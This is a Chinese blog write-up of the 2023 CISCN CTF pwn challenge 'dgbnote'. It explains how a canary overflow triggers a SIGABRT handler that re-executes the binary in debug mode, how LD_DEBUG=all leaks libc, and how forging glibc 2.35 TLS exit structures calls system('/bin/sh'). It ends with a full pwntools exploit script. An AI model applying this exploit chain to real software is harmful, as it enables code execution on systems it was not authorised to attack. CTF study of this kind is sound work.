@@ -1,0 +1,268 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>2023Ciscn-dgbnote详解 | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>2023Ciscn-dgbnote详解</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-06-26T04:32:38.000Z" id="date"> 2023-06-26</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-07-04T09:20:09.075Z" id="updated"> 2023-07-04</time></div></span><br><span>文章总字数: <div class="control">2.7k</div></span><br><span>预计阅读时间: <div class="control">11 分钟</div></span></div></div><hr><div id="post-content"><p>2023Ciscn华东南分区赛遇到的一题 觉得题目的考点非常新颖和有趣 所以打算仔细研究一下</p>
+<h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p>题目用到了singal函数  该函数可以捕捉对应的信号 并且调用指定的信号处理函数</p>
+<p>来看一下题目中所涉及到的两个single函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">signal(<span class="number">6</span>, handler);</span><br><span class="line">signal(<span class="number">14</span>, my_exit);</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数代表的是产生的信号 这里的6是SIGABRT 当进程非正常终止 调用abort函数的时候会触发</p>
+<p>14是SIGALRM 如果程序设置的alarm函数超时 就会触发</p>
+<p>下面是截取网上的大部分信号表格及其描述</p>
+<table>
+<thead>
+<tr>
+<th><strong>Signal</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SIGABRT</td>
+<td>由调用abort函数产生，进程非正常退出</td>
+</tr>
+<tr>
+<td>SIGALRM</td>
+<td>用alarm函数设置的timer超时或setitimer函数设置的interval timer超时</td>
+</tr>
+<tr>
+<td>SIGBUS</td>
+<td>某种特定的硬件异常，通常由内存访问引起</td>
+</tr>
+<tr>
+<td>SIGCANCEL</td>
+<td>由Solaris Thread Library内部使用，通常不会使用</td>
+</tr>
+<tr>
+<td>SIGCHLD</td>
+<td>进程Terminate或Stop的时候，SIGCHLD会发送给它的父进程。缺省情况下该Signal会被忽略</td>
+</tr>
+<tr>
+<td>SIGCONT</td>
+<td>当被stop的进程恢复运行的时候，自动发送</td>
+</tr>
+<tr>
+<td>SIGEMT</td>
+<td>和实现相关的硬件异常</td>
+</tr>
+<tr>
+<td>SIGFPE</td>
+<td>数学相关的异常，如被0除，浮点溢出，等等</td>
+</tr>
+<tr>
+<td>SIGFREEZE</td>
+<td>Solaris专用，Hiberate或者Suspended时候发送</td>
+</tr>
+<tr>
+<td>SIGHUP</td>
+<td>发送给具有Terminal的Controlling Process，当terminal被disconnect时候发送</td>
+</tr>
+<tr>
+<td>SIGILL</td>
+<td>非法指令异常</td>
+</tr>
+<tr>
+<td>SIGINFO</td>
+<td>BSD signal。由Status Key产生，通常是CTRL+T。发送给所有Foreground Group的进程</td>
+</tr>
+<tr>
+<td>SIGINT</td>
+<td>由Interrupt Key产生，通常是CTRL+C或者DELETE。发送给所有ForeGround Group的进程</td>
+</tr>
+<tr>
+<td>SIGIO</td>
+<td>异步IO事件</td>
+</tr>
+<tr>
+<td>SIGIOT</td>
+<td>实现相关的硬件异常，一般对应SIGABRT</td>
+</tr>
+<tr>
+<td>SIGKILL</td>
+<td>无法处理和忽略。中止某个进程</td>
+</tr>
+<tr>
+<td>SIGLWP</td>
+<td>由Solaris Thread Libray内部使用</td>
+</tr>
+<tr>
+<td>SIGPIPE</td>
+<td>在reader中止之后写Pipe的时候发送</td>
+</tr>
+<tr>
+<td>SIGPOLL</td>
+<td>当某个事件发送给Pollable Device的时候发送</td>
+</tr>
+<tr>
+<td>SIGPROF</td>
+<td>Setitimer指定的Profiling Interval Timer所产生</td>
+</tr>
+<tr>
+<td>SIGPWR</td>
+<td>和系统相关。和UPS相关。</td>
+</tr>
+<tr>
+<td>SIGQUIT</td>
+<td>输入Quit Key的时候（CTRL+\）发送给所有Foreground Group的进程</td>
+</tr>
+<tr>
+<td>SIGSEGV</td>
+<td>非法内存访问</td>
+</tr>
+<tr>
+<td>SIGSTKFLT</td>
+<td>Linux专用，数学协处理器的栈异常</td>
+</tr>
+<tr>
+<td>SIGSTOP</td>
+<td>中止进程。无法处理和忽略。</td>
+</tr>
+<tr>
+<td>SIGSYS</td>
+<td>非法系统调用</td>
+</tr>
+<tr>
+<td>SIGTERM</td>
+<td>请求中止进程，kill命令缺省发送</td>
+</tr>
+<tr>
+<td>SIGTHAW</td>
+<td>Solaris专用，从Suspend恢复时候发送</td>
+</tr>
+<tr>
+<td>SIGTRAP</td>
+<td>实现相关的硬件异常。一般是调试异常</td>
+</tr>
+<tr>
+<td>SIGTSTP</td>
+<td>Suspend Key，一般是Ctrl+Z。发送给所有Foreground Group的进程</td>
+</tr>
+<tr>
+<td>SIGTTIN</td>
+<td>当Background Group的进程尝试读取Terminal的时候发送</td>
+</tr>
+<tr>
+<td>SIGTTOU</td>
+<td>当Background Group的进程尝试写Terminal的时候发送</td>
+</tr>
+<tr>
+<td>SIGURG</td>
+<td>当out-of-band data接收的时候可能发送</td>
+</tr>
+<tr>
+<td>SIGUSR1</td>
+<td>用户自定义signal 1</td>
+</tr>
+<tr>
+<td>SIGUSR2</td>
+<td>用户自定义signal 2</td>
+</tr>
+<tr>
+<td>SIGVTALRM</td>
+<td>setitimer函数设置的Virtual Interval Timer超时的时候</td>
+</tr>
+<tr>
+<td>SIGWAITING</td>
+<td>Solaris Thread Library内部实现专用</td>
+</tr>
+<tr>
+<td>SIGWINCH</td>
+<td>当Terminal的窗口大小改变的时候，发送给Foreground Group的所有进程</td>
+</tr>
+<tr>
+<td>SIGXCPU</td>
+<td>当CPU时间限制超时的时候</td>
+</tr>
+<tr>
+<td>SIGXFSZ</td>
+<td>进程超过文件大小限制</td>
+</tr>
+<tr>
+<td>SIGXRES</td>
+<td>Solaris专用，进程超过资源限制的时候发送</td>
+</tr>
+</tbody></table>
+<h2 id="readlink"><a href="#readlink" class="headerlink" title="readlink"></a>readlink</h2><p>该函数用于获取当前程序的绝对路径</p>
+<p>其一共有三个参数 第一个参数代表一个符号链接 第二个参数代表要存储的空间 第三个参数代表多少字节</p>
+<p>而&#x2F;proc&#x2F;self&#x2F;exe指向当前程序的绝对路径 所以原题中的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readlink(<span class="string">&quot;/proc/self/exe&quot;</span>, v2, <span class="number">0x4F</span>uLL);</span><br></pre></td></tr></table></figure>
+
+<p>就相当于获取当前程序的绝对路径 并且存储到v2内存空间中</p>
+<h2 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h2><p>配合上面我们得到v2中存储的是当前程序的绝对路径</p>
+<p>题目中的这一行 相当于就是重新运行了程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(v2, *&amp;buf[<span class="number">56</span>], *&amp;buf[<span class="number">48</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>第二个和第三个参数用来规定新线程中的argv和envp参数</p>
+<h2 id="argv"><a href="#argv" class="headerlink" title="argv"></a>argv</h2><p>简单来说 argv就是传入main函数的参数数组 其中argv[0]是程序名 本题中main函数一开就对argv的参数做了检测</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v4 = a2[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;dbg&quot;</span>) )</span><br><span class="line">    sub_1B70();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v4, <span class="string">&quot;run&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果为dbg 那么就可以进入sub_1b70函数 这个函数中存在任意写的机会</p>
+<p>而如果程序的argv[1]参数不是run 就会终止程序 在远程环境中 默认就是以run为参数运行的程序 在我们本地复现的时候 需要注意手动加上参数</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041501580.png" alt="image-20230704150138479"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = process([<span class="string">&quot;./pwn&quot;</span>,<span class="string">&#x27;run&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<h2 id="envp"><a href="#envp" class="headerlink" title="envp"></a>envp</h2><p>envp是main函数的第三个参数 用来存储环境变量的指针 而有这样一个环境变量 LD_DEBUG&#x3D;all</p>
+<p>其原本是用来查看链接库的情况 从而诊断报错 但是其在输出一系列信息的同时 会顺带输出libc地址</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041527228.png" alt="image-20230704152739137"></p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>到此为之 题目的核心考点其实比较明了了  就是利用信号14的handler函数来重新启动程序  并且我们可以控制argv的参数 使其为dbg 我们就可以进入漏洞函数</p>
+<p>为了实现这一点 我们需要触发abort 而本题开启了canary 并且在输入index或者是size时 存在了单字节的溢出 可以覆盖到canary的最后一个字节 那么当check触发时 调用__stack_chk_fail函数时 其内部会通过libc_message函数来输出报错信息 其中就会调用到abort函数</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041513529.png" alt="image-20230704151349487"></p>
+<p>但是还有一个问题我们没有办法解决 虽然dgb函数中给了我们任意地址读和任意地址写的功能 但是开启了PIE保护的情况下 我们要如何获取libc地址来构造rop链呢</p>
+<p>就是利用将程序的环境变量指针替换为指向LD_DEBUG&#x3D;all字符串的指针 从而泄露libc</p>
+<p>你可以注意到 在我们输入username后的下一个输入点 存在2字节的溢出 而后面的内容正好是envp环境变量</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041529582.png" alt="image-20230704152944558"></p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041529061.png" alt="image-20230704152909029"></p>
+<p>同时你可以发现sub_14b0函数 可以泄露出栈地址的后两个字节</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041532282.png" alt="image-20230704153210244"></p>
+<p>而我们如果在一开始的username中输入LD_DEBUG&#x3D;all字符串 那么此时就可以在对应的偏移中看到指向该字符串的指针  </p>
+<p>配合该偏移 我们可以在后续的溢出中将环境变量的指针替换成指向LD_DEBUG&#x3D;all字符串 从而在程序重新运行的时候输出libc基址</p>
+<h2 id="exit调用链"><a href="#exit调用链" class="headerlink" title="exit调用链"></a>exit调用链</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">sub_1B70</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s[<span class="number">9</span>]; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  s[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please don&#x27;t patch this normal function, we will check it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Debug the note.&quot;</span>);</span><br><span class="line">  s[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Addr] &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">8uLL</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Read] &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s[<span class="number">0</span>]);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Addr] &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">8uLL</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;[Write] &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s[<span class="number">0</span>], <span class="number">0x90</span>uLL);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到dbg函数虽然给了任意地址读和任意地址写 看起来好像我们可以往栈上写入rop链 随后劫持程序执行流 但是实际不会执行到leave和ret来结束栈帧 就会触发exit 所以我们这里只能通过布局tls结构体来控制exit函数</p>
+<p>2.35以上的版本  exit函数内部调用了__run_exit_handlers函数 </p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041704491.png" alt="image-20230704170431440"></p>
+<p>而该函数内部又调用了一个关键的函数 可以供我们实现任意函数调用</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041705601.png" alt="image-20230704170511575"></p>
+<p>下面跟着我来分析一下如何构造tls结构体 以此来实现system函数调用</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041707838.png" alt="image-20230704170734787"></p>
+<p>这里的rbx的值通常是不会变化的 其取决于rip索引 我们这里需要使得je跳转失败 从而才能进入任意函数调用的部分</p>
+<p>这里的rbp取值是根据tls结构体低地址处 我们计算好偏移以后 利用dgb函数的任意写机会将其修改不为0后即可不跳转</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041710607.png" alt="image-20230704171004573"></p>
+<p>这部分的内容是新版本加入的指针保护机制  通过循环右移11位后和tls结构体中的key异或后解密指针</p>
+<p>当然我们拥有tls结构体任意写的权限话 很容易就能绕过 我们只需要使得rax一开始为0 设置fs:0x30处为system函数</p>
+<p>异或过后rax的值就被设置成了system函数地址</p>
+<p>而rdi寄存器的参数取决于rbp寄存器 rbp寄存器的值取决于我们一开始任意写的地址 fs_base-88处存放的值</p>
+<p>计算好偏移 我们可以得到下面的payload 其可以实现call system 并且rdi参数为binsh</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(target+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(target+<span class="number">0x18</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<p>但是你会发现system函数会卡在这里</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041714298.png" alt="image-20230704171453250"></p>
+<p>这是因为我们破坏了tls结构体  我们把断点打在pthread_setcancelstate</p>
+<p>看看rdx寄存器是怎么样赋值的</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041715302.png" alt="image-20230704171544271"></p>
+<p>于是fs_base+0x10处的值不能被破坏 我们通过观察原本的tls结构会发现 其和fs_base+0x8处 是构成一个链表 由偏移0x10处指向偏移0x8处 而偏移0x8处指向自身</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041717023.png" alt="image-20230704171742004"></p>
+<p>但是经过我实际测试 我们只需要保证fs:0x10处的地址+0x971后 是一个可读的内存地址即可 也就是说libc_addr-0x972也可以通过</p>
+<p>那么最后的payload即为:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(target+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(target+<span class="number">0x18</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(libc_addr-<span class="number">0x972</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process([<span class="string">&quot;./pwn&quot;</span>,<span class="string">&#x27;run&#x27;</span>])</span><br><span class="line"><span class="comment">#io = remote(&quot;175.20.26.10&quot;,9999)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;UserName: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;LD_DEBUG=all&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;LD_DEBUG=all@Note $ &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x150D)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">&quot;++--++--&quot;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Super note: &quot;</span>)</span><br><span class="line">number = <span class="built_in">int</span>(io.recv(<span class="number">5</span>),<span class="number">10</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(number))</span><br><span class="line">io.recvuntil(<span class="string">&quot;LD_DEBUG=all@Note $ &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1730)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">number += <span class="number">0x1c</span></span><br><span class="line">payload = cyclic(<span class="number">0x30</span>)+p16(number)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;LD_DEBUG=all@Note $ &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;Note_Add&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x19</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x17ff)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;base: &quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;[Addr] &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1BF1)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">envp_addr = libc_addr + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">io.send(p64(libc_addr))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">target = libc_addr - <span class="number">0x2898</span> - <span class="number">0x28</span> - <span class="number">0x58</span></span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;[Addr] &quot;</span>)</span><br><span class="line">success(<span class="string">&quot;target_addr :&quot;</span>+<span class="built_in">hex</span>(target))</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1C32)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(p64(target))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(target+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(target+<span class="number">0x18</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(libc_addr-<span class="number">0x972</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(system_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;[Write] &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1C6A)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/03/2023%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%9D%AF%E8%BD%A6%E8%81%94%E7%BD%91%E6%AF%94%E8%B5%9B%E5%88%9D%E8%B5%9B/">← Next 2023天融信杯车联网比赛初赛</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/25/2023Ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/">2023Ciscn华东南分区赛 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061934765.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>Dr.chen</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#signal"><span class="toc-number">1.</span> <span class="toc-text">signal</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#readlink"><span class="toc-number">2.</span> <span class="toc-text">readlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#execve"><span class="toc-number">3.</span> <span class="toc-text">execve</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#argv"><span class="toc-number">4.</span> <span class="toc-text">argv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#envp"><span class="toc-number">5.</span> <span class="toc-text">envp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">6.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exit%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">7.</span> <span class="toc-text">exit调用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">8.</span> <span class="toc-text">完整exp</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
